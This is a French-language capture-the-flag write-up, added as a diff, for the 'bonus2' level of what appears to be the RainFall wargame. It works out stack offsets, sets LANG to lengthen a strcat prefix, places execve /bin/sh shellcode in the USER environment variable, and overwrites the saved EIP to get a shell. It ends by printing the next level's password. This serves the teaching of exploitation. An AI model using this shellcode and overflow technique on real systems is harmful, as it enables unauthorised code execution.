@@ -1,0 +1,40 @@
+L'adresse de EIP a ecraser est sauvgarde a l'adresse:	0xbffff6ec
+
+Nous avons plusieurs declarations de chaine de caraceteres:
+	<main>
+		char *tmp qui se trouve a $esp		_1_
+		char *str qui se trouve a $esp + 0x50	_2_
+		char *lang qui se trouve a $esp+ 0x9c	_3_
+	<greetuser>
+		char *puts				_4_
+
+<main>
+	bzero->strncpy->strncpy:	Pour que _2_ est la argv[1] + argv[2], il faut que _2_ soit superieur ou egal a 0x28.
+	memove:				L'instruction va copier 76 (0x13 * DWORD (0x4))  caracteres dans _1_ (esp main).
+<greetuer>
+	Avec un env de base on va retrouver un strcat avec en premier argument un "Hello " (taille 0x6) et en second notre string _1_. _2_ se trouve a 0xbffff540 et cette string peut ecrire jusqu'a 0xbffff58c.
+	La sauvgarde EIP a ete faite dans l'adresse : 0xbffff58c. Dommage on n'arrive jsute devant l'offset. Donc on doit changer l'env afin que notre premier argument de strcat fasse 2 caracteres de plus. On peut don set un env LANG="fi" / LANG="nli" car le premier argument aura commet taille : 0x12 /0xc
+
+	export LANG="fi"
+	_4_ : 0xbffff560 + 0x12 + 0x4c = 0xbffff5be
+	EIP : 0xbffff5ac
+strcat prends deux arguments le premier a une taille de 0x12.
+Le second est forme avec strncpy(tmp, argv[1], 0x28). Donc une taille de 0x28. Puis un autre strncpy(tmp + 0x28, argv[2],0x20); Donc la taille de notre string argm2 est de 0x28 + 0x20.
+Donc notre strcat pourra faire au maximum : 0x12 + 0x28 +0x20 = 0x5a
+Et notre offset est a : 0x4c
+
+0x4c + 0x4 - 	0x12 - 0x28 	=	0x12
+EIP saved  -	s_arg1 - s_argv[1] =	s_arfv[2]
+
+Donc notre argv[2] doit avoir une taille de 0x12 pour ecraser l'eip sauvgarde.
+
+On va entroduire notre shellcode via l'environement, puis rechercher son adresse via notre binaire getenvaddr
+Et modifier notre script python afin argv[2] a l'offset 0x14 on y trouve l'addresse de USER="XXXX"
+
+bonus2@RainFall:~$ USER=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+bonus2@RainFall:~$ ./getenvaddr USER ./bonus2
+USER will be at 0xbffff956
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*0x28') $(python -c 'print "B"*0x12 + "\x56\xf9\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBV���
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
